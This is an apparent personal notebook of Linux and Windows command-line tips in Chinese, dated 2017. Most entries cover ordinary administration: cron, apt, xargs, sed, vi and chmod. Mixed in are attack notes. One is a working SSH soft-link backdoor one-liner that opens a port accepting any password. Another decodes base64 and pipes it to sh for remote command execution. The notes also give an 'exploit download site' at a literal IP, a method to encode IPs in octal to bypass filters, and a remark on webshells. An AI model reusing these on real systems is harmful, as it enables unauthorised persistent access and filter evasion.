#第7列要运行的命令
00      4       *       *       *       root    ~/backup/sh/DB_Backup.sh
#每天凌晨4点执行数据库备份
00      6       1,8,15,23,30    *       *       root    ~/backup/sh/Source_Code_Backup.sh
#每月的1号，8号，15号，23,号，30号的凌晨6点执行源代码备份
```

### 2017年4月7日

```
Linux有一些编码工具,base64,16进制

base64,并不是很好用,因为base64有时候会出现`/`字符
编码: echo "hello" | base64 
解码: echo "aGVsbG8K" | base64 -d

16进制
编码: echo "hello" | xxd -p
解码: echo "68656c6c6f0a" | xxd -r -p

优缺点: 存在字符长度问题，当然如果是无法连接外网的时候，这个还是能写shell的

远程命令执行直接解码后sh执行
echo "xxxxxx" | base64 -d | sh
```

### 2017年4月7日

```
exp下载站：http://123.206.29.105:2222

7BCE1D69
17363416551
http://017363416551:2222
http://000000017363416551:2222

十进制 ---||||||> 十六进制 ---||||||> 八进制 然后在访问时 指定协议然后加个0。
http://0[八进制] 比如 115.239.210.26 首先用.分割数字 115 239 210 26 然后选择10进制转换16进制！
(要用0来表示前缀，可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样！)
首先把这四段数字给 转成 16 进制！结果：73 ef d2 1a  然后把 73efd21a 这十六进制一起转换成8进制！
结果：16373751032
然后指定协议 http:// 用0表示前缀 加上结果 链接：
http://0016373751032
```

### 2017年4月7日

```
dpkg (Debian Package)管理工具，软件包名以.deb后缀。这种方法适合系统不能联网的情况下。
基于Debian的ubuntu，kali都是这种。
sudo dpkg -i tree_1.5.3-1_i386.deb 安装软件
sudo dpkg -r tree 卸载软件

APT（Advanced Packaging Tool）高级软件工具。这种方法适合系统能够连接互联网的情况。
依然以tree为例
sudo apt-get install tree 安装tree
sudo apt-get remove tree 卸载tree
sudo apt-get update 更新软件
sudo apt-get upgrade

将.rpm文件转为.deb文件
.rpm为RedHat使用的软件格式。在Ubuntu下不能直接使用，所以需要转换一下。
sudo alien abc.rpm
```

### 2017年4月7日

```
/etc/profile 系统环境变量
.bashrc 用户环境变量
alias 对命令重命名，之间在上述文件修改，如：alias showmeit="ps -aux" 
修改完成后使用source xx 来生效
```

### 2017年4月7日

```
linux下使用as编译，ld链接汇编
源文件 test.s后缀
as -o test.o test.s
ld -o test test.o
./test

windows下使用masm编译，link链接
源文件 test.asm后缀
新打开DOS下使用，一路回车即可，默认命名
```

### 2017年4月7日

```
tail -f file.log 实时得到新追加到文件中的信息，常用来跟踪日志文件

kill -9 PID 结束进程，直接exit干掉

tr 替换，删除
tr [A-Z] [a-z] 大写转小写
tr 'A-Z' 'a-z'   
tr -d xxx 删除xxx字符串

用户根目录~下存在隐藏文件
.bash_history
.mysql_history
....
可以查看管理员操作

执行sh脚本三种方式
./test.sh
. test.sh
sh test.sh
还有bash..等等
可执行文件只能使用./test，使用后俩会提示无法执行二进制文件

gcc -c -o test test.c
等于
gcc -c test.c 生成test.o
gcc -o test test.o 生成可执行文件
-o 命名
```

### 2017年4月1日

```
碰到分割字符串，或者格式化字符串的问题
xargs 将从管道进来的输入或者是标准型输入的内容，将其中的换行符以及空白，全部用空格来替代。
xargs -d 字符
按某个字符来分割。
xargs -n 数字
每行显示数字个词。

xargs -I {} 命令 {}
格式化每个字符，然后放到大括号里，输入到下一个命令来充当参数。
cat url.txt | xargs -I {} echo 'http://{}' >> 1.txt
读取文件里面的每一行内容，然后再之前加上http://并输出到1.txt
这里使用excle更快，选中一栏>输入等号>点击原字符串>加号是&>需要添加的字符放进双引
如  =A1&"str"
如果是删除相同字符，则直接利用文本处理软件，如word.，notepad++，使用替换功能
或者使用sed -i 's/str1/str2/g'

xargs和find碰撞:
管道是读取的字符串，是将前者的输出作为后者的输入。
而xargs是将读取的字符串作为文件名字来给后面命令做其文件参数处理。
find ./ | xargs grep "string"
搜索当前目录下所有文件内含"string"字符串的文件和位置
或者直接grep "string" *
...
```

### 2017年4月7日

```
chmod +x test 
chmod a+x test
是将三个组全部加上执行权限。
chmod u+x test
g+x
o+x
才是指定组
```

### 2017年4月7日

```
Linux下查看各种服务的端口开放情况
netstat -antp | grep sshd...
查看当前运行进程的状态
ps aux
但最好使用ps -ef

Windows下对应的为
netstat -ano
tasklist
```

### 2017年4月7日

```
vi编辑器
dd 删除当前行
yy 复制当前行
p 粘贴
:g/p1/s//p2/g 将文中所有p1用p2来替换

vi -o/-O file1 file2... 分屏打开
或者 :new file2
Ctrl+w w 切换屏显示
Ctrl+w q 关闭当前屏的文件

:set nu(mber) 显示行号
62G 定位到第62行首

:w newfile 另存为新文件
:r newfile 讲新文件内容附加到文末

/str 从光标开始向下搜索str
?str 向上
n 同方向向下继续搜索str
N 反方向

:X 加密
```

### 2017年4月7日

```
linux软连接后门
ln -sF /usr/sbin/sshd /tmp/su;/tmp/su -oP 4444;
即可监听4444端口，链接
ssh root@xxx.xxx.xxx.xxx -p 4444
密码随意
```

### 2017年4月7日

```
环境变量，在终端界面
Windows下使用%......%
Linux下使用$.....
都是set查看环境变量
```

### 2017年4月7日

```
碰到需要替换字符的场景，可以用sed。
sed -i 's/需要被替换的字符/替换的字符/g'
全部遍历替换并保存。
sed '/正则/d' 
sed '1,5d'
删除正则行，删除一到五行。
sed 's/123/&456/g'
被替换的字符123作为&变量带入替换的字符串，即123----123456。
```

### 2017年4月7日

```
修改host文件，尝试屏蔽广告。

C:\Windows\System32\drivers\etc
```

### 2017年4月7日

```
linux系统挂载本地硬盘
mount xxx.xxx.xxx.xxx:/tmp /mnt/nfs
```

### 2017年4月7日

```
php弱口令利用来写的webshell，Python下有没有类似的弱口令？true+true==2
可以，Python也是弱类型语言
```